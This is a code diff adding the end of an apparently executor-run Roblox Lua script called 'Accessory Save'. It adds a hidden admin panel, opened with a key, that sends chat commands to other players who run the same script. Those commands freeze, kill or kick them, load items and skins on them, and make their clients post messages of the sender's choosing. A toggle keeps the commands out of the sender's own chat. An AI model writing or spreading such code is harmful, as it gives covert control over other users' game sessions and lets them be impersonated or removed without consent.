+    New("UICorner", { CornerRadius = UDim.new(0, 8) }, List)
+    New("UIListLayout", { SortOrder = Enum.SortOrder.LayoutOrder, Padding = UDim.new(0, 2) }, List)
+
+    local function DropText()
+        Drop.Text = (Selected and Selected.Name or "Select a player") .. "  v"
+    end
+
+    RefreshList = function()
+        for _, Child in ipairs(List:GetChildren()) do
+            if Child:IsA("TextButton") or Child:IsA("TextLabel") then
+                Child:Destroy()
+            end
+        end
+        local Count = 0
+        for _, Player in ipairs(Players:GetPlayers()) do
+            if Roster[Player.UserId] and Player ~= LocalPlayer then
+                Count += 1
+                local B = New("TextButton", {
+                    LayoutOrder = Count, Size = UDim2.new(1, -6, 0, 28), BackgroundTransparency = 1, Text = Player.Name,
+                    Font = Enum.Font.Gotham, TextSize = 15, TextColor3 = Color3.new(1, 1, 1), ZIndex = 6,
+                }, List)
+                B.MouseButton1Click:Connect(function()
+                    Selected = Player
+                    List.Visible = false
+                    DropText()
+                end)
+            end
+        end
+        if Count == 0 then
+            New("TextLabel", {
+                LayoutOrder = 1, Size = UDim2.new(1, -6, 0, 28), BackgroundTransparency = 1, Text = "Nobody else has the script",
+                Font = Enum.Font.Gotham, TextSize = 14, TextColor3 = Color3.fromRGB(170, 170, 170), ZIndex = 6,
+            }, List)
+        end
+        if Selected and not (Roster[Selected.UserId] and Selected.Parent) then -- left the server
+            Selected = nil
+            DropText()
+        end
+    end
+
+    Drop.MouseButton1Click:Connect(function()
+        List.Visible = not List.Visible
+        if List.Visible then
+            if os.clock() - LastPing > 5 then
+                LastPing = os.clock()
+                SendChat(".ping")
+            end
+            RefreshList()
+        end
+    end)
+
+    -- Returns the picked player, or notifies and returns nil
+    local function Pick()
+        List.Visible = false
+        if Selected and Selected.Parent then
+            return Selected
+        end
+        Notify("Pick a player first")
+    end
+
+    for Index, Info in ipairs({ { "Freeze", "freeze" }, { "Kill", "kill" }, { "Kick", "kick" } }) do
+        local Width = 72
+        local B = Button(Info[1], 90, 16 + (Index - 1) * (Width + 6), Width)
+        B.MouseButton1Click:Connect(function()
+            local Player = Pick()
+            if Player then
+                SendChat("." .. Info[2] .. " " .. Player.Name)
+            end
+        end)
+    end
+
+    -- Emote: .e [emote name] user
+    local EmoteBox = Box("Emote name (can be shortened)", 140)
+    local EmoteButton = Button("Play emote", 180)
+    EmoteButton.MouseButton1Click:Connect(function()
+        local Player = Pick()
+        local Emote = EmoteBox.Text:match("^%s*(.-)%s*$")
+        if Player and Emote ~= "" then
+            SendChat(".e " .. Emote .. " " .. Player.Name)
+        end
+    end)
+
+    -- Load hat
+    local HatBox = Box("Hat id", 232)
+    local HatButton = Button("Load hat", 272)
+    HatButton.MouseButton1Click:Connect(function()
+        local Player = Pick()
+        local Id = HatBox.Text:match("^%s*(%d+)%s*$")
+        if not Id then
+            Notify("Hat id must be numbers")
+        elseif Player then
+            SendChat(".gh " .. Player.Name .. " " .. Id)
+        end
+    end)
+
+    -- Chat: makes their client say the message
+    local ChatBox = Box("Message for them to chat", 324)
+    local ChatButton = Button("Chat", 364)
+    ChatButton.MouseButton1Click:Connect(function()
+        local Player = Pick()
+        local Message = ChatBox.Text:match("^%s*(.-)%s*$")
+        if not Player or Message == "" then
+            return
+        end
+        if IsOffensive(Message) then
+            Notify("That message is blocked")
+            return
+        end
+        SendChat(".say " .. Player.Name .. " " .. Message:sub(1, 200))
+    end)
+
+    -- Skin: one of your own saves, loaded on them
+    local SkinBox = Box("Skin name (one of your saves)", 416)
+    local SkinButton = Button("Load my skin on them", 456)
+    SkinButton.MouseButton1Click:Connect(function()
+        local Player = Pick()
+        local Name = CleanName(SkinBox.Text)
+        if Player and Name ~= "" then
+            task.spawn(AdminLoadSkin, Player.Name, Name)
+        end
+    end)
+
+    -- Send in chat: off keeps the commands out of your own chat
+    local ToggleButton = Button("", 508)
+    local function ToggleText()
+        ToggleButton.Text = "Send in chat: " .. (SendInChat and "ON" or "OFF")
+        ToggleButton.BackgroundColor3 = SendInChat and Color3.fromRGB(60, 140, 90) or Color3.fromRGB(75, 75, 75)
+    end
+    ToggleText()
+    ToggleButton.MouseButton1Click:Connect(function()
+        SendInChat = not SendInChat
+        ToggleText()
+    end)
+
+    Connect(UserInputService.InputBegan, function(Input)
+        if Input.UserInputType ~= Enum.UserInputType.Keyboard or Input.KeyCode ~= Enum.KeyCode.Eight or UserInputService:GetFocusedTextBox() then
+            return
+        end
+        Panel.Visible = not Panel.Visible
+        List.Visible = false
+        if Panel.Visible then
+            RefreshList()
+        end
+    end)
+    RefreshList()
+end)
+if not AdminOk then
+    warn("[Accessory Save] Admin setup failed: " .. tostring(AdminErr))
+end
+
+Genv.AccessorySaveStop = function()
+    Alive = false
+    for _, Connection in ipairs(Connections) do
+        pcall(function() Connection:Disconnect() end)
+    end
+    if Frozen then
+        pcall(function()
+            local Character = LocalPlayer.Character
+            if Character then
+                for _, Part in ipairs(Character:GetDescendants()) do
+                    if Part:IsA("BasePart") then
+                        Part.Anchored = false
+                    end
+                end
+            end
+        end)
+    end
+    if FreezeConnection then
+        pcall(function() FreezeConnection:Disconnect() end)
+    end
+    if PanelGui then
+        PanelGui:Destroy()
+    end
+end
+
+Notify("Ready, .help prints the commands")
